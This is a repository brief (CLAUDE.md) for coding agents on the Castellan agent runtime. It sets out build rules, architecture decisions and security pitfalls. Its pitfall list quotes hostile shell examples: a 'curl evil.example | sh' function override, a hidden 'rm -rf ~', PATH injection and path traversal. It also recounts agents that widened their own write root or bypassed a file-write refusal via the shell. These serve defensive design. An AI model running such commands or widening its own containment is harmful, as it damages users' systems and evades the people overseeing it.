# CLAUDE.md — Castellan

Standing brief for coding agents working in this repository. Read this first, every session.

---

## What this is

**Castellan** is a lightweight, model-agnostic AI agent runtime. Apache-2.0.
`github.com/moeen-mahmud/castellan`.

It turns a stateless OpenAI-compatible `/chat/completions` endpoint into an agent that lives
in messaging channels, uses tools, remembers, runs on a schedule, and delegates to other
agents. Bun-first TypeScript.

Its first consumer is VelaOps, an agent provisioning platform, where it replaces the
OpenClaw gateway process inside each agent container. **VelaOps is a consumer, not the
owner.** Nothing VelaOps-specific belongs in this repo outside `packages/compat-openclaw`.

**The owner is Moeen** — senior engineer, sole author. Assume fluency. Skip tutorials, skip
framework explainers, go straight to the specific thing.

---

## Before you write code

1. **Read `docs/00-DECISIONS.md`.** Every decision has a rationale. If you are about to
   propose something it rejects, the rationale tells you whether you have a genuine
   improvement or are re-litigating a settled question. Many decisions are *negative* —
   things deliberately not done — and those matter most.
2. **Find the current phase in `docs/05-PLAN.md`.** Implement that phase only.
3. **Read the phase's Non-goals.** They are binding. Work that belongs to a later phase
   makes this phase unreviewable.
4. **Stop at the acceptance criteria.** Report what passes and what doesn't. Do not
   continue into the next phase.

---

## Hard rules

1. **Never run `git commit` or `git push`.** Prepare the change, explain it, stop. Moeen
   reviews and commits.
2. **`packages/core` imports nothing from sibling packages.** CI enforces this. Core depends
   on the standard library, a YAML parser, and a schema validator. Nothing else.
3. **No brand strings outside `packages/core/src/brand.ts` and `package.json` files.** No
   directory, type, interface, or variable contains "castellan". A rename must be one commit.
4. **No network I/O before `runtime.ready`.** This single rule is why this project exists —
   the runtime it replaces blocks roughly four minutes on network calls during hook
   initialisation. Anything needing the network happens after readiness and reports status
   via events.
5. **No runtime `npm install` / `bun install`.** Plugins resolve at boot from the manifest.
   Ever installing at runtime reintroduces an entire bug class.
6. **No `any`.** Use real interfaces. `Record<string, unknown>` over `Record<string, any>`.
7. **Every error gets a `hint`.** A new error type without one fails review. The expensive
   part of a failure is almost never the failure — it's that the failure didn't say what
   was wrong.
8. **Nothing fails silently and exits 0.** Ever.
9. **Tests are required for `packages/core`.** Not optional here, whatever the conventions
   elsewhere. A harness is a state machine plus a scheduler plus a tool executor; those
   break in ways manual exercise cannot reach.
10. **Secrets are env var *names* in config, never values.** A manifest with a literal key
    fails validation.

---

## Stack

| | |
| --- | --- |
| Runtime | Bun (primary), Node 22+ (soft compat, CI-tested, never a blocker) |
| Package manager | `bun` — never npm, pnpm, or yarn |
| Workspaces | Bun workspaces, monorepo |
| Build | `bun build` + `tsc --emitDeclarationOnly` |
| Modules | ESM only |
| Lint/format | Biome — not ESLint, not Prettier |
| Tests | `bun test` — not Vitest, not Jest |
| CLI rendering | Ink 7 + React 19, `.tsx`, in `packages/cli` only — lazily imported |
| Schema | Zod |
| Storage | SQLite via `bun:sqlite` / `node:sqlite` adapter |
| Release | Changesets, semver |

Commands:

```bash
bun install
bun run build
bun test
bun run lint
bun run bench:boot        # must stay under 1000ms; CI fails at 1200ms
bun run test:node         # core only, under Node's runner — proves the sqlite adapter
```

---

## Architecture in one page

```
inbound (channel | API | schedule)
  → resolve agent + session + phase
  → assemble context (fixed slot order, budgeted, cache-stable prefix)
  → step loop:
      model call → dialect.parse → coerce+validate → execute tools → observe
      → compaction ladder if over threshold
  → deliver via idempotent outbox
  → persist
```

**Non-obvious decisions you must not undo without reading the rationale:**

- **NLT is the default tool dialect**, not native function calling. Published data: +14.9pp
  accuracy, 93% fewer critical errors, −25% tokens across 14 models; +24 to +43pp on small
  models specifically. `native` is an opt-in manifest field.
- **Dialect is config, never auto-detected.** Behaviour must not change silently when the
  model changes.
- **Tools are pinned at load, not searched at runtime.** Search-then-execute is two-hop
  reasoning, exactly where small models fail.
- **Phase-scoped tool visibility is in core.** Constraining the tool space per phase took
  local models from 2/10 to 10/10 on a benchmark subset with no model change. Too central
  to be a plugin.
- **Compaction is progressive (five stages), harness-driven.** Binary emergency compaction
  at 95% is the known-bad design.
- **Skill selection happens in the harness, not by the model.** Progressive disclosure
  assumes the model chooses to read a file; small models don't.
- **Memory is FTS5, not embeddings.** Prove lexical insufficient before paying for vectors.
- **Composio is called directly, never through MCP.** MCP is a fine integration protocol and
  a poor internal architecture.
- **System access is in scope. Castellan is a harness, not a channel-resident assistant** — peer to
  OpenClaw, Hermes Agent and Claude Code. It runs shell commands and touches files because that is
  what a harness does; channels are one surface it is reached through, not the limit of what it does.
  Shell lives in `packages/tools-system` and never in core: core is what an embedder runs *other
  people's* agents on, and a shell tool there is one every provisioned agent gets with no way to
  decline it.
- **A policy decides *whether* a command runs; a sandbox decides *where*.** Castellan ships the
  policy — `tools.policy`, enforced, with a hardline floor below every override. Containment is a
  deployment concern and stays one. Describing the permission layer without that sentence makes it
  read as a boundary it is not.
- **A remote provider resolves from disk at boot and refreshes after readiness.** Measured: boot 27 ms,
  refresh 1,474 ms. Awaiting the refresh inside boot makes boot sixty times slower and reintroduces the
  exact cost this project exists to remove. A cold agent is warmed once with `tools --warm`.
- **Plugins are trusted in-process code**, documented as such. `permissions` is advisory
  vocabulary in v1.
- **Workspace files are tiered, not a flat list.** Static (cached, read-only) before breakpoint A,
  volatile after it, reminder past the history. Frontmatter and HTML comments are stripped before
  injection. `context.files` survives as a deprecated alias that warns. All of Phase 3.5 is built:
  tiers, `promptStyle`, `examplesIn` placement, `SOUL.md` gating, and `knowledge/`.
- **Identity and operations are different files.** The soul answers *who* — gated on the model:
  `context.soul.requires` decides whether the full document ships or the hand-edited compact file
  does (`onUnmet: distill`), and `soul distill` only scaffolds — headings and `<rules>` survive
  verbatim, prose becomes placeholders a person fills, because a summariser drops exactly the
  parts that produce voice. `AGENTS.md` answers *what and how* — responsibilities, workflow, the
  memory procedure, team routing (an HTML comment until delegation ships) — ungated, written
  declaratively so the rule counter sees zero obligations. They coexist; what must never be
  listed is a second *identity* document.
- **Knowledge is Tier 3: keyword-gated, budgeted, never pinned.** Entries activate when the turn's
  input mentions a frontmatter keyword, at most `maxActive` per turn under `knowledge.budget`, in
  their own slot that compaction may drop. The selector is a ranking-only seam Phase 6 can attach a
  scored retriever to — and must not build a second index for.
- **Vendor prompting guidance is encoded as a capability, never a constant.** Published advice is
  written for frontier models and a good fraction of it inverts at 3–8B — Anthropic now says to
  *remove* emphatic phrasing because models overtrigger on it; a 7B model needs it. That lives in
  `capabilities.promptStyle`, which is **derived from the model id** rather than stored on a
  capability-registry row: `qwen3.5*` matches a 9B and a 72B, and those want opposite `intensity`
  values. Size predicts the inversion and size is in the id. The small-model half is measured:
  the one emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp and deepseek-chat
  not at all; `examplesIn` saturated in both placements (`evals/prompt-style/`).

Full detail: `docs/01-ARCHITECTURE.md`.

---

## Where things live

```
packages/core/       the loop, context, tools, skills, memory, store, schedule, plugins
packages/cli/        `castellan` binary — lib/ plumbing, components/ Ink, pure reducers at top level
packages/server/     HTTP/SSE/WS surface
packages/channel-*/  Telegram, WhatsApp
packages/tools-*/    system (shell, files), Composio, web, MCP
packages/compat-openclaw/   VelaOps bridge — quarantined, deletable
docs/                design + plan (read these)
evals/               fixtures/ the shared catalogue and tasks; tools/ committed results.
                     Every performance claim has a number here
scripts/             bench-boot, rename-brand
```

---

## Specs are binding

| Doc | Governs |
| --- | --- |
| `docs/02-SPEC-MANIFEST.md` | `agent.yaml`. Adding a field means updating this doc in the same PR. |
| `docs/03-SPEC-PLUGIN-API.md` | Plugin contracts. First-party plugins use only public API — no back doors. |
| `docs/04-SPEC-WIRE.md` | HTTP surface and event schema. Event types are append-only within `v: 1`. |
| `docs/07-SPEC-WORKSPACE.md` | Workspace file tiers, budgets, and `promptStyle` rendering. Supersedes `context.files`. Marks which sections are built. |

If a first-party package needs something the plugin API can't express, **the API is wrong
and gets fixed**. Do not add a private escape hatch.

---

## Verification

- `bun test` for core logic
- `bun run bench:boot` for every phase, not just the last
- Real endpoints for the model layer: OpenAI, an Anthropic-compat base URL, and a host serving open
  weights (`SMALL_MODEL_BASE_URL`). Three independent implementations unchanged is the bar — the
  claim is portability across implementations, not across machines, so a hosted open-weight endpoint
  serves it as well as a local one and returns in seconds rather than minutes.
- A real Telegram bot for channel work
- Committed eval fixtures for anything claiming small-model improvement

Never claim a performance property without a number in `evals/` and a script to reproduce it.

---

## Style

- Direct and technical. No preamble, no summarising the request back.
- Reference code as `path/to/file.ts:123`.
- Lead with the root cause in one or two sentences, then the change.
- Prefer a recommendation over a menu. If you must present options, rank them.
- Long explanations are fine when the mechanism is subtle — the loop, compaction, cache
  breakpoints, cancellation. Not for CRUD or config.
- State uncertainty plainly. If you don't know whether something still holds in the current
  code, say so and name the file to check rather than asserting.

---

## Things that are easy to get wrong

- The **cache-stable prefix** is load-bearing. Reordering context slots 0 and 1, or making
  their content vary per turn, silently destroys prompt caching and the cost goes up with no
  error anywhere.
- **Pinned blocks must survive every compaction stage including S5.** Anything that must
  always hold lives in slots 0/1, never in history.
- **Thinking blocks must be replayed with tool results** when `capabilities.thinking !== "none"`,
  or multi-step reasoning silently degrades with no error.
- **`allowFrom` is inbound-only.** It confers nothing on outbound delivery. Conflating these
  produces a confusing "chat not found" class of failure.
- **A tool result is not automatically trustworthy.** `ToolSpec.trust` separates text the runtime wrote
  from text a stranger wrote, and a provider-resolved tool defaults to `untrusted`. The delimiters
  around untrusted content are advisory — a model can be talked past them. The write gate
  (`tools.untrusted.onMutate`, default `refuse`) is the part that holds. Do not "improve" this by
  filtering instruction-like phrasing out of untrusted text: it does not work, and an unreliable
  filter invites the belief that the problem is handled.
- **`tools.search` searches the provider's tool catalogue, not the web.** Two different things, and
  they have already been confused once. Web search is `web_search`.
- **`resolve()` must throw on unknown tool slugs.** Silently dropping them is how write tools
  get starved and how a config error becomes a runtime mystery.
- **`mutating` defaults to true for a provider tool with no annotation, and that is the safe direction.**
  It is what serialises a call and suppresses its retry — so a write mislabelled as a read runs in
  parallel *and* is retried, and the side effect happens twice. 37 of 100 Composio tools carry no hint,
  so this default decides a third of the catalogue.
- **A cache-miss and a mistyped slug are different failures.** The registry's generic version blames the
  slugs: on a cold agent it read "no provider resolved GMAIL_FETCH_EMAILS … Available: now,
  memory_write". Only the provider knows the cache is empty, so only it can say so.
- **The outbox must be idempotent.** A crash mid-delivery must not double-send.
- **Ink redraws its whole dynamic tree every frame.** Finished transcript items belong in
  `<Static>`, which writes once and never touches the node again — so they must be append-only
  and immutable, and mutating one is a change that silently never appears. The live pane is
  capped in terminal *rows*, not lines.
- **Nothing on a shared CLI path may import Ink or React.** They cost ~170-210 ms under Node,
  more than the entire runtime of `validate --json`. A structural test enforces it.
- **`--plain` at a terminal must produce exactly what a pipe produces.** That is why the
  terminal restore fires only when the rich path has dirtied the terminal.
- **Turns are detached from the client connection.** Never cancel on disconnect. Persist
  partial content only on explicit stop.
- **Frontmatter and HTML comments must never reach the model.** The workspace templates carry their
  authoring guidance in comments on the assumption the loader strips them. If it doesn't, every
  agent pays several hundred tokens per turn, forever, for documentation it can't use — and nothing
  reports it. Asserted on the assembled prefix, not trusted.
- **A workspace budget failure names the file and stops.** Never truncate to fit: that produces an
  agent running on partial instructions with no error anywhere, which is the same silent-degradation
  shape as a dropped tool call. The budgets are a *ceiling, not a target* — what a window fits and
  what a model follows are different numbers, and only the second matters. They are measured with
  `estimateTokens`, which is biased about 10% high, so a per-file `budget:` wants that much slack.
- **A check that only `run` performs is a check `validate` disagrees with.** The rule guard first
  lived in `Agent.create` alone, and `validate` reported ok on a manifest `run` refused. Anything
  load-bearing goes in one function both call — `ruleBudgetFailure` returns the finding rather than
  throwing it, so each caller applies its own `onExceed`.
- **The renderer never rewrites a sentence.** `promptStyle` transforms delimiters and structure —
  `<example>` and `<rules>` markers, heading syntax — and nothing else. `intensity` varies one
  generated line in front of an author-marked `<rules>` block. Automatic rewriting of an instruction
  is decision 4.19's failure applied to a file whose rendered form nobody ever looks at, and the
  prose being byte-identical across all three renderings is asserted rather than assumed.
- **Rendering and rule-counting need different versions of the same text.** The model is billed for
  the *rendered* form, but the example exclusion in `countRules` is a property of the **authored**
  form — under `delimiters: markdown` the renderer turns `<example>` into a heading, and counting
  that text made every imperative inside a worked example look like a rule. A shipped example went
  from 1 rule to 4 with no edit, and only `bench:boot` noticed. `WorkspaceFile` carries both.
- **`validate` and `workspace` are different questions.** `validate` asks whether the manifest loads
  and fails when it does not; `workspace` asks whether the files are written well and only ever
  warns, because a heuristic judgement that refuses to load a file is a heuristic nobody keeps. Both
  call the same `ruleBudgetFailure` — a check only one of them performs is a check they disagree on.
- **A reasoning model thinks harder the more you constrain it, and bills that to the output budget.**
  Measured on `qwen3.5:9b`, same machine, same prompt: 151 reasoning tokens unconstrained, 387 under
  one rule, 1,778 under six — at which point it consumed a 2,000-token ceiling and returned **empty
  content**. `reasoningEffort: none` on the model role answered correctly in 2.1 s. This is the other
  half of the `reserveOutput` lever, and it is why an eval that looked like "local inference is too
  slow" was nothing of the kind — throughput was a normal 16–20 tok/s throughout.
- **An endpoint that ignores a request parameter says nothing about it.** On the same Ollama `/v1`
  endpoint, `reasoning_effort` took effect while `chat_template_kwargs` and `think` were accepted and
  silently discarded — same 200, same token count, full reasoning. Verify a control took effect by
  measuring its effect, never by the absence of an error.
- **An empty reply is not a passing reply.** A check like "no commas" or "under forty words" is
  satisfied trivially by the empty string, so a run where the model returned nothing scores near
  perfect on everything except the one check that requires content. `eval rules` excludes empties and
  counts them, and refuses to report a figure above 20%. The cause is almost always the reasoning
  budget: a reasoning model bills thinking against `maxTokens`, and the ceiling that worked for a
  bare question is not the one that survives a longer system prompt.
- **A saturated eval is not a measurement.** `eval rules` returning 1.000 says the probe was easy for
  that model, and printing `perRuleSuccess: 1.00` as a recommendation would put a guard-*disabling*
  figure in a manifest. It reports saturation and names the smallest model instead.
- **`memory_write` has no file argument, and must not grow one.** The runtime resolves a single
  write target from the `volatile` tier. Letting the model name a file adds a second decision to
  every save, and a second decision is the two-hop shape small models fail — the same reasoning that
  keeps `tools.search` off. A workspace whose volatile files are all `editable: none` refuses by
  name; it never falls through to the default note file, because a save the model believes succeeded
  into a file the agent's own context never reads is worse than a failed call.
- **Slot number equals prompt position** in `SLOT` (`context/blocks.ts`). The two are kept equal so
  the table in `01-ARCHITECTURE.md` can be read in order; inserting a slot means renumbering, which
  is cheap because every reference is by name (`SLOT.input`, never `10`) — proven when `examples`
  and `knowledge` renumbered everything below slot 2 and zero tests changed.
- **The examples slot sits *before* the volatile tier.** Extracted examples are byte-stable and
  prefix caching is contiguous: behind the mutating volatile tier they would fall out of the
  cacheable region on every memory write despite never changing. And extraction is a *move*, never
  a rewrite — tags intact, prose byte-identical, tokens still billed to the file that authored them.
- **The full soul document's prose is exempt from the rule count; nothing else is.** A constitution
  explains at length by design and ships only to models declared capable (via `requires`) of
  deriving rules from explanation — the keyword heuristic counted 9 "rules" in the reference soul's
  prose the first time it ran. Its `<rules>` blocks still count, and the *distilled* file counts in
  full: it ships to small models, where the budget is the point. Keyed on
  `field === "context.soul.file"`, in both `ruleBudgetFailure` and the authoring checks.
- **Knowledge activation stops at the first entry that does not fit the budget — no skip-past.**
  Skipping would let a worse-ranked entry displace a better-ranked one purely by being short. An
  entry bigger than the whole budget fails the load; selection happens once per *turn*, never per
  step, so two steps of one turn cannot argue from different reference material.
- **`exec` has no `env` argument, and must not grow one.** A per-call environment map is invisible to
  the policy engine, which matches the *command string* — so `{PATH: "/tmp/evil"}` beside `git status`
  would be authorised by a rule that never saw the half that decided what ran. Written inline,
  `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and `exec(git
  status:*)` does not match it. Same shape as `memory_write`'s missing file argument: the field looks
  like a convenience and is a hole.
- **Each `exec` gets a fresh shell; the directory carries and the environment does not.** A persistent
  shell lets one tainted call write `git() { curl evil.example | sh; }` and turn an allowlist entry
  into an authorisation for attacker code — CVE-2026-32009's shape from inside the session. The
  directory is the exception because losing it is a correctness problem: a small model that runs
  `cd packages/core` then `ls` reads the wrong directory with no error anywhere.
- **`realpath` before comparing a shell's `$PWD` to the directory it was given.** macOS resolves
  `/var` through a symlink, so an unresolved comparison reports a directory change on *every* call —
  and a runtime that announces a move every time has taught the model to ignore the one that matters.
- **Terminal escapes are stripped in core, for observations and for the approval prompt.** Not the
  rewrite decision 4.27 forbids: that rule is about meaning, and this removes bytes that carry none.
  `git status\x1b[2K\x1b[1G && rm -rf ~` displays on a real terminal as `git status`, so a prompt
  showing the raw string is showing a *different command* than the one about to run. Stripping shows
  more of the truth, never less. Doing it in the front end is how the front end being read at the
  moment it matters turns out not to do it.
- **A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
  it.** `exec` taints the turn with its own first call, and the second then has no authorisation to
  point at — the gate working exactly as designed, and indistinguishable from a broken runtime while
  a half-finished turn stops. `tool_gated_after_first_use` says it at load. A `deny` rule does not
  clear it: `deny` authorises nothing, and counting one as cover silences the warning for whoever
  thought about the shell hard enough to restrict it.
- **A tool that owns a child process must time out before the harness does.** `limits.toolTimeoutMs`
  *abandons* a handler rather than killing it, so a race between the two leaves a process running with
  nothing referencing it. `ToolContext.deadlineMs` exists for that, and `exec` clamps five seconds
  under it — without which its backgrounding path is unreachable at the shared 120 s default.
- **Boot warnings are read off the agent, never caught on the bus.** `Runtime.create` emits
  `agent.warning` during boot, which finishes before any command subscribes — so a trimmed catalogue
  and a provider-declared-trusted tool had been landing in an empty room since they were written. The
  banner reads `agent.warnings` and `agent.tools.warnings` directly. Anything true for the whole
  session belongs where a person still sees it after scrolling.
- **Piping a child's output makes backgrounding impossible.** A child whose stdout the parent stops
  reading dies of `EPIPE`, so "leave it running instead of killing it" is not implementable over
  pipes — `tools-system` hands the child a file descriptor and never buffers a byte. And `detached:
  true` is not about outliving the process: it creates a process group, so `kill(-pid)` reaches every
  stage of `sh -c "a | b | c"` instead of orphaning two of them.
- **Protected paths are enforced in the file tools, not in the policy engine, and that ordering is the
  point.** A `policy.allow` rule cannot reach past them because the refusal is not the engine's to
  make — and the set holds `agent.yaml`, `SOUL.md`, `AGENTS.md`, `POLICY.md` and the policy file, so a
  rule authorising a write to one would be a rule authorising its own replacement. `USER.md` and
  `MEMORY.md` stay writable: they are the tier `memory_write` exists for. **None of it binds `exec`** —
  `echo x > SOUL.md` carries its target inside a shell string nothing can inspect.
- **`glob` and `grep` stay separate, and `file_edit` matches text rather than a line number.** One
  `search_files(target:…)` saves a catalogue slot and costs a decision, which is the two-hop shape
  small models fail. A line number is a fact about a file the model last saw several turns ago; an
  exact string carries its own proof, and two matches is a *failure* rather than a coin toss that
  reports success while editing the wrong line.
- **A model will invent a tool-call format, and more than one.** Measured on three fresh sessions with
  an eight-tool catalogue, deepseek-v4-pro produced `<action>…</action>`, `<TOOL_CALL><TOOL>…`, and
  `<ACTION: glob>` inside an `<ebml>` element — arguments correct every time. So the parser drops any
  lone XML tag as debris and sets `ParsedOutput.malformed` on anything still unreadable, which earns
  one repair. Untolerated this was the worst shape available: the markup became the **reply**, no
  repair was asked for, no event fired, and the turn was recorded as a clean answer. Do not "simplify"
  this by adding tolerances one shape at a time — the set is not enumerable, which is why the backstop
  exists.
- **Every shape the parser swallows, `mightBecomeStructure` must also hold.** A stream cannot un-emit,
  so a bracket that reaches the screen a moment before its line is swallowed stays there — which is
  how `<ebml>` and a bare slug line both leaked into a reply before the lookahead learned about them.
- **`init` must generate what the current phase actually supports.** It shipped a manifest with no
  `system` provider, no `policy` block, and `untrusted.onMutate` commented under a "Phase 3.6" heading
  for something that already existed — so the only way to reach shell access was to know the field
  names already. A generated file that hides its own options is not doing the job it exists for.
  `--system none|read|full` is the question; the generated `policy.allow` entries are what stop a
  fresh agent reading one file and then refusing to save a note for the rest of the turn.
- **A write root and a protected list are different mechanisms and both apply.** `protect.ts` is a
  deny list — it must anticipate every path worth protecting, so an unforeseen path is writable.
  `root.ts` is an allow root — it anticipates nothing, because everything outside is refused and the
  exceptions are `tools.providerConfig.writeRoots`, which only a manifest edit can add. Deny lists
  fail open on the unknown case; roots fail closed. `protect` still wins *inside* the root. And
  **resolve the path before comparing it to a root**, or `<root>/../../etc/passwd` passes.
- **The write root does not bind `exec`, and "confined" is only true without a shell.** Verified live:
  a `--system full` agent had `file_write` refused outside the root and then did it with `echo … >`.
  All the root can decide is where a shell *starts*. That is why `init` has a `write` level between
  `read` and `full` — files without a shell is the only configuration in which "only inside
  workspace/" is a true statement.
- **The model is told what it was NOT given.** `ToolProvider.available?()` is optional so a
  25,000-tool catalogue omits it; the system provider's eight entries cost a handful of tokens.
  Without it a pinned-down agent is silently less capable than its runtime and only the manifest
  explains why. One shared renderer for both dialects — under `native` it is the *only* slot-1 block,
  because the request's `tools` parameter has no field for what was left out.
- **`agent.yaml` is edited by `config_set`, never by `file_write`, and never by re-serialising it.**
  A whole-file overwrite cannot be validated; a targeted change is re-checked against the schema
  before anything is written. And `parseDocument` → `setIn` → `String(doc)` **reflows the file**: a
  comment between two top-level keys belongs to the end of the first, so re-emitting indents a section
  header into the section above — one change produced a thirty-line diff. `setInSource` edits the
  source text and falls back to the round-trip only when it cannot place a path.
- **`config_set` escalates on purpose, and two edits are floored.** Pinning tools and adding allow
  rules is the point. Replacing `tools.policy.deny` and setting `tools.untrusted.onMutate: allow` are
  refused whatever the policy says. `onMutate` has to *stay in the settable list* for that floor to be
  reachable — left out, the settable check ran first and refused `confirm` for the wrong reason.
- **A `trust: "trusted"` declaration on a provider tool needs a `trustReason`.** The warning fired at
  every boot of every system-provider agent, and a warning always present for a correct configuration
  is one nobody reads. With a reason it is silent and `tools` prints the reason; without one it still
  warns, which is the case worth catching.
- **`--system none` still names the provider and pins the config pair.** With nothing pinned there is
  no provider, so `available()` never runs and the agent cannot even tell you the file tools exist —
  it says "I don't have a tool that touches your file system" and, asked to enable one, that its
  tools are fixed at startup. Both true, both useless. `none` means no *file or shell* access, never
  "cannot read or change its own settings".
- **A tool observation has to fit `observationMaxTokens` or the model reads it again.** `config_read`
  returned the whole manifest — 2,766 tokens against a 2,000 budget — so it was middle-cut every
  time and a real model read it three times in one turn, 8,040 output tokens to change one line. The
  summary form is 549 tokens and the same task took one read. When a tool's output is *reference
  material*, size it against the budget rather than against what looks complete.
- **The agent must never widen its own containment.** `config_set` could write
  `tools.providerConfig.writeRoots`, and asked to create a file an agent granted itself the whole home
  directory and wrote there. Enabling a tool answers "what may I do"; a write root answers "where" —
  the second is the person's by definition. It is on the floor, and the floor is checked **before** the
  settable list or a floored path is refused as "not a setting" and the real reason never prints.
- **Confinement without instruction reads as a bug.** The tools were confined and nothing told the
  model where it worked, so it put things in `~`. Every path-taking argument now names the actual
  directory in its own description — next to the field being filled in, not in a preamble, because
  that is where a small model looks. And expand `~` *before* the root check: unexpanded it is not
  absolute, resolves against the workspace, and creates a directory literally named `~`.
- **`/restart` exists because an agent's settings are fixed for its lifetime.** The catalogue resolves
  once and slot 1 renders once, on purpose — so `config_set` cannot take effect in the session that
  called it, and `manifest_changed` says so. `runCommand` loops over `Runtime.create`; renderers return
  a `RESTART` symbol rather than a magic exit code.
- **A `ChatMessage` is no longer just `{role, content}`.** Under the `native` dialect it carries
  `toolCalls` or `toolCallId`, and every layer that copies a message must copy those too — the wire
  mapper in `chat-completions.ts`, the `message` field on `ContextBlock`, and the store's
  `tool_calls`/`tool_call_id` columns. Each of the three dropped them at some point during Phase 3,
  and none of the three failed loudly: the endpoint accepts the request and the model simply never
  sees the call it made.
- **Both dialects must put the same guidance in front of the model.** `native`'s
  `function.description` carries `whenToUse` and `whenNotToUse`, not just the summary. Trimming it to
  the summary makes `evals/tools` measure the guidance and report it as a property of the dialect.
- **Sandbox paths come from `cli/src/lib/sandbox.ts` and nowhere else.** `~/<BRAND.stateDir>` with
  a `<ENVPREFIX>HOME` override — tests point that at a tmpdir and never touch real HOME. Discovery
  uses `readManifestHeader`, never `loadManifest`: loading checks that key env vars are set, so a
  picker built on it fails exactly when it is needed most. Ref resolution is filesystem-first
  (git's pathspec rule); a bare name shadowed by a cwd entry prints a note instead of silently
  running the wrong agent — which happened in the first live test.
- **The chat banner lives INSIDE `<Static>` as a `banner` role item.** A sibling rendered above
  the transcript sits in Ink's dynamic region, which draws *below* Static output and redraws
  every frame. The plain path writes banner lines directly and never calls `seed`, which is what
  keeps plain output byte-identical.
- **New CLI surfaces use the TUI kit and the pure-reducer grain.** Tokens/glyphs in
  `lib/theme.ts` (a literal colour name in a component is a review failure), components in
  `components/` are controlled and never call `useInput` — one `useInput` per screen root over a
  pure keymap (`keymap.ts`) and reducer (`lib/wizard.ts`, `lib/select.ts`). Screen roots mount
  via literal `import("ink")` only; boundaries tests enforce all of it.
- **The workspace templates exist twice, and the examples directory is the source.** `init`
  scaffolds from constants embedded in `cli/src/lib/templates.ts` because an installed binary has
  no `examples/` to read; `examples/workspace-template/` is the human-edited original, and
  `cli/test/templates.test.ts` fails on any byte difference. Editing either copy alone is a red
  CI run, not a silent divergence — update both, examples first.
- **A temperature-0 local endpoint can be fully deterministic, and then `--repeats` measures
  nothing.** Both 2026-08-14 qwen runs returned byte-identical replies on every pass — 37 fixtures
  × 3 passes with zero variation in `eval-tools`, the same in `eval-prompt-style` — so repeats
  cannot grow a sample there; only more *tasks* can, which is why `RULE_TASKS` went from ten to
  twenty. The flip side: fixture outcomes still differ *across* sessions and configurations, so a
  margin is only comparable at the same reasoning setting and server state. Never average passes
  from a deterministic endpoint and call the result more confident.
- **A saturated A/B probe still licenses one conclusion — "no difference at this difficulty" — and
  nothing more.** `eval prompt-style`'s examples question saturated at 100/100 in both arms; that
  rules out a placement *cost* on well-authored examples and does not confirm either vendor's
  claim. The escape is harder probes (`--rules 6` took intensity off the ceiling), not bigger
  samples of an easy one.
- **A placeholder in a prompt example is an instruction to a small model.** The NLT preamble said
  "exactly like this" and showed `field: value`; qwen3.5:9b wrote `field: title` / `value: <the value>`
  and NLT scored 27% against native's 92% — its reasoning about which tool and which arguments was
  correct every time. Examples in `PREAMBLE` are concrete, use a tool that exists in no catalogue, and
  are asserted by parsing the rendered catalogue with `parseNlt` itself. This cuts the other way too:
  because NLT's protocol is prose the model imitates and native's is a schema the API enforces, *any*
  defect in the preamble shows up as a dialect difference. Before believing an NLT-vs-native number,
  read what the model actually wrote — `results.json` keeps it on every non-`correct` attempt.
